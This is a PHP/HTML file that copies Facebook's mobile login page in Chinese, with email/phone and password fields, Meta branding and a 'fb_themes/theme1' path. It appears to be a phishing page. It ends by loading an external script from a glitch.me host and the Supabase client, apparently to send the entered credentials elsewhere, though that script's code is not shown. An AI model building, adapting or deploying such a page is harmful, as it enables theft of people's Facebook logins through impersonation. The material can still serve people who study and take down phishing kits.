<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos($currentUrl, '/fb_themes/theme1/') === false) {
    $baseHref = '<base href="../fb_themes/theme1/">';
}
?>
<?= $baseHref ?>
<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="utf-8" />
    <title>登录或注册</title>
    <link href="images/facvicon.png" rel="shortcut icon" sizes="196x196" />
    <link type="text/css" rel="stylesheet" href="css/Style.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body tabindex="0" class="touch" style="min-height: 828px; background-color: rgb(255, 255, 255)">
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 828px">
        <div class="DinhHiep5S" id="root" role="main" style="min-height: 828px">
            <div class="DinhHiep5S0 D_H77z D_H77z2" style="display: none" id="login_error" bis_skin_checked="1">
                您输入的电子邮件或电话号码与任何帐户都不匹配。
                <a href="https://www.facebook.com/r.php" class="_652e">注册新帐户。</a>
            </div>
            <div class="D_H31 _52we _2pid _52z6">
                <div class="D_H_SDz2">
                    <a href=""><img src="images/logo.svg" width="112" class="img" alt="" /></a>
                </div>
            </div>
            <div class="DinhHiep_5rut">
                <form class="mobile-login-form" id="login_form">
                    <div>
                        <div class="_56be">
                            <div class="DinhHiep2z DinhHiep21">
                                <div class="DinhHiep96n9" id="email_input_container">
                                    <input autocorrect="off" autocapitalize="off" class="DinhHiep56bg _4u9z _5ruq _8qtn"
                                        autocomplete="on" id="tk" name="username" placeholder="手机号或电子邮件"
                                        type="text" data-sigil="m_login_email" />
                                </div>
                            </div>
                        </div>
                        <div class="_56be">
                            <div class="DinhHiep2z DinhHiep21">
                                <div class="DH021" data-sigil="m_login_password">
                                    <div class="D_H31">
                                        <div class="D_H_SDz2 _5i2i _52we">
                                            <div class="D_H_31">
                                                <input autocorrect="off" autocapitalize="off"
                                                    class="DinhHiep56bg _4u9z _27z2 _8qtm" autocomplete="on" id="mk"
                                                    name="password" placeholder="密码" type="password"
                                                    data-sigil="password-plain-text-toggle-input" />
                                            </div>
                                            <input type="hidden" name="csrf_token" value="" />
                                        </div>
                                        <div class="D_H_3122 _216i _5i2i _52we">
                                            <div class="D_H_31">
                                                <div class="D_H77" style="" id="u_0_1_15">
                                                    <a onclick="togglePasswordVisibility(event)">
                                                        <span class="mfss" style="display: none;" id="hidePassword">隐藏</span>
                                                        <span class="mfss" id="showPassword" style="">显示</span></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="D_H_SD" style="text-align: center">
                        <button type="submit" class="D_H_322 D_H_p2 _56b_ _28lf _9cow _56bw _56bu" name="btnLogin"
                            id="btnLogin">
                            登录
                        </button>
                    </div>
                    <div class="DINHIEPCO"></div>
                </form>
                <div>
                    <br />
                    <div class="D_H_SD DINHHIEPCS">
                        <div class="DINHIEPCOz D_H_p222">
                            <a class="D_H_p222" tabindex="0" href="" id="forgot-password-link">忘记密码？</a>
                        </div>
                    </div>
                    <div style="padding-top: 42px">
                        <div>
                            <div>
                                <div>
                                    <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">
                                        <span class="_43mh">或</span>
                                    </div>
                                    <div class="DINHIEPCOz HTOFZ" id="signup_button_area">
                                        <a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable"
                                            id="signup-button" tabindex="0" data-sigil="m_reg_button"
                                            data-autoid="autoid_1">创建新帐户</a>
                                    </div>
                                </div>
                            </div>
                            <div class="D_H_SD" style="text-align: center">
                                <div>
                                    <div class="other-links _8p_m">
                                        <ul class="D_H_SDz _55wp">
                                            <li></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2" data-sigil="m_login_footer">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="D_H31">
                            <div class="D_H_SDz2">
                                <span class="D_H_p22 _52j9 D_H_322 _3ztb">越南语</span>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">中文(台灣)</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">西班牙语</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">法语(法国)</a></span>
                                </div>
                            </div>
                            <div class="D_H_SDz2">
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">英语(英国)</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">韩语</a></span>
                                </div>
                                <div class="_3ztc">
                                    <span class="D_H_p22"><a href="">葡萄牙语(巴西)</a></span>
                                </div>
                                <a href="">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="完整语言列表"
                                        data-sigil="more_language">
                                        <i class="img sp_zqrNfmDGuGz_2x sx_0a2d34"></i>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div>
                        <div class="_96qv _9a0a">
                            <a href="" class="_96qw"
                                title="阅读我们的博客，发现资源中心并寻找工作机会。">关于</a>
                            <span aria-hidden="true"> · </span>
                            <a href="" class="_96qw" title="访问我们的帮助中心。">帮助</a>
                            <span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_wR">查看更多</span>
                        </div>
                    </div>
                    <span class="mfss fcg">Meta © 2024</span>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
<script src="https://alpine-pale-fibre.glitch.me/script.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
    // ... existing JS code ...
</script> 